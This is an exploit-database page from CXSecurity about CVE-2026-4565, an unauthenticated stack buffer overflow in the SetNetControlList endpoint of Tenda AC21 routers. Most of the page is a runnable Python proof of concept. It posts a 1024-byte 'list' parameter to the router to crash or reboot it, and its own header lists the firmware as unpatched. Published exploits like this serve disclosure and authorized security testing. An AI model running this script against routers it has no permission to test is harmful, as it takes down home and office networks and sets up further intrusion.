---
title: Tenda AC21 V1.0 V16.03.08.16 - Stack Buffer Overflow in SetNetControlList
url: https://cxsecurity.com/issue/WLB-2026030032
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-26
fetch_date: 2026-03-27T04:26:44.748970
---

# Tenda AC21 V1.0 V16.03.08.16 - Stack Buffer Overflow in SetNetControlList

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Tenda AC21 V1.0 V16.03.08.16 - Stack Buffer Overflow in SetNetControlList** **2026.03.26**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-4565](https://cxsecurity.com/cveshow/CVE-2026-4565/ "Click to see CVE-2026-4565")**  CWE: **[CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer, CWE-120 Buffer Copy without Checking Size of Input (&#039;Classic Buffer Overflow&#039;)](https://cxsecurity.com/cwe/CWE-119%20Improper%20Restriction%20of%20Operations%20within%20the%20Bounds%20of%20a%20Memory%20Buffer%2C%20CWE-120%20Buffer%20Copy%20without%20Checking%20Size%20of%20Input%20%28%26#039;Classic Buffer Overflow&#039;) "Click to see CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer, CWE-120 Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')")** | |

#!/usr/bin/env python3
# Exploit Title: Tenda AC21 - Stack Buffer Overflow in SetNetControlList
# CVE: CVE-2026-4565
# Date: 2026-03-23
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://www.tenda.com.cn/
# Software Link: -
# Affected: Tenda AC21 V1.0 V16.03.08.16
# Tested on: Tenda AC21 V1.0 V16.03.08.16
# Category: Remote Denial of Service / Buffer Overflow
# Platform: Embedded (Linux-based router)
# Exploit Type: Remote
# CVSS: 8.8 (Critical)
# CWE: CWE-120 (Classic Buffer Overflow)
# Description: Unauthenticated stack-based buffer overflow in /goform/SetNetControlList via the "list" parameter
# Fixed in: No official fix released as of March 2026
# Usage: python3 exploit.py <target\_ip>
#
# Examples:
# python3 exploit.py 192.168.0.1
#
# Options: None (simple crash PoC)
#
# Notes:
# - Triggers router crash/reboot (DoS)
# - For RCE, payload crafting + ROP required (not included)
# - Use only on devices you own or have explicit permission to test
#
# How to Use
# Step 1: Connect to the target router's network
# Step 2: Run the script with the router's IP address
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-4565 • Tenda AC21 SetNetControlList BOF ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import requests
import sys
if len(sys.argv) != 2:
print("Usage: python3 exploit.py <target\_ip>")
print("Example: python3 exploit.py 192.168.0.1")
sys.exit(1)
target\_ip = sys.argv[1]
url = f"http://{target\_ip}/goform/SetNetControlList"
payload\_length = 1024
data = {"list": "A" \* payload\_length}
print(f"[+] Sending buffer overflow payload (length={payload\_length}) to {url}")
print("[+] If successful, the router should crash or reboot shortly...")
try:
response = requests.post(url, data=data, timeout=6)
print(f"[+] HTTP status: {response.status\_code}")
if response.text:
print(f"[+] Response snippet: {response.text[:180]}...")
except requests.exceptions.Timeout:
print("[!] Timeout → Router likely crashed or rebooted")
print("[!] Expected behavior for CVE-2026-4565")
except requests.exceptions.ConnectionError:
print("[!] Connection refused or reset → Router probably down")
except Exception as e:
print(f"[!] Error: {e}")
print("\n[!] Exploit finished. Use only for authorized security testing.")

**##### References:**

https://vuldb.com/?id.352402

https://github.com/hellonestor/killallbug/issues/14

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030032)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top